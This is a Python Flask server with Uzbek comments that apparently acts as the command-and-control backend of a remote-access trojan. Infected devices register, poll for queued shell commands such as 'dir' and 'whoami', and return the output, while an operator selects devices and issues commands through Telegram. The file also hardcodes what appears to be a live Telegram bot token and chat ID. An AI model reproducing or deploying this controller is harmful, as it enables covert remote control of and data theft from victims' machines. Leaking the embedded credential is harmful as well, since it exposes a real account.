from flask import Flask, request, jsonify
from telegram import Bot
import os
import datetime

# Telegram sozlamalari
BOT_TOKEN = "7754620943:AAGDtVt1o2SAZNvKtrNoJ725tW1htQBsflw"
ADMIN_CHAT_ID = 1612270615 
bot = Bot(BOT_TOKEN)

# Flask app
app = Flask(__name__)

# Xotirada saqlash
devices = {}   # {deviceId: {"hostname":..., "lastSeen":...}}
commands = {}  # {deviceId: ["dir", "whoami", ...]}
selected_device = None

# Qurilma ro'yxatdan o'tadi
@app.post("/register")
def register():
    data = request.json
    deviceId = data["deviceId"]
    hostname = data["hostname"]

    devices[deviceId] = {"hostname": hostname, "lastSeen": datetime.datetime.now()}
    if deviceId not in commands:
        commands[deviceId] = []

    bot.send_message(ADMIN_CHAT_ID, f"✅ Yangi device qo'shildi!\n💻 {hostname}\n🆔 {deviceId}")
    return jsonify({"status": "ok"})

# Qurilma buyruqlarni olib ketadi
@app.get("/get-command/<deviceId>")
def get_command(deviceId):
    cmds = commands.get(deviceId, [])
    commands[deviceId] = []  # olgandan keyin bo'shatamiz
    return jsonify({"commands": cmds})

# Qurilma natija yuboradi
@app.post("/send-result")
def send_result():
    data = request.json
    deviceId = data["deviceId"]
    cmd = data["cmd"]
    result = data["result"]

    bot.send_message(
        ADMIN_CHAT_ID,
        f"💻 {deviceId} → {cmd}\n-----------------\n{result[:4000]}"
    )
    return jsonify({"status": "ok"})

# Telegram komandalar
@app.get("/telegram/<command>")
def telegram_handler(command):
    global selected_device

    args = request.args.get("args", "").split()

    if command == "devices":
        if not devices:
            bot.send_message(ADMIN_CHAT_ID, "❌ Hozircha device yo'q")
        else:
            text = "📋 Aktiv qurilmalar:\n"
            for d, info in devices.items():
                text += f"💻 {info['hostname']} (ID: {d})\n"
            bot.send_message(ADMIN_CHAT_ID, text)

    elif command == "select":
        if args:
            selected_device = args[0]
            bot.send_message(ADMIN_CHAT_ID, f"✅ Device tanlandi: {selected_device}")

    elif command == "command":
        if selected_device and args:
            cmd = " ".join(args)
            commands[selected_device].append(cmd)
            bot.send_message(ADMIN_CHAT_ID, f"📤 Buyruq yuborildi: {cmd}")
        else:
            bot.send_message(ADMIN_CHAT_ID, "❌ Avval device tanlang: /select <id>")

    return jsonify({"status": "ok"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
